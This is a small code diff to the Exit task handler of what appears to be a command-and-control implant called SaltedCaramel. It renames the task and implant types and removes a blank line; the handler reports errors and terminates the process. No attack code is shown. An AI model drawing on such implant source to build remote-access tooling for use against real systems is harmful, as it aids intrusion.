@@ -4,7 +4,7 @@ namespace SaltedCaramel.Tasks
 {
     internal class Exit
     {
-        internal static void Execute(SaltedCaramelTask task, SaltedCaramelImplant implant)
+        internal static void Execute(SCTask task, SCImplant implant)
         {
             try
             {
@@ -15,7 +15,6 @@ namespace SaltedCaramel.Tasks
                 implant.SendError(task.id, e.Message);
             }
             Environment.Exit(0);
-
         }
     }
 }
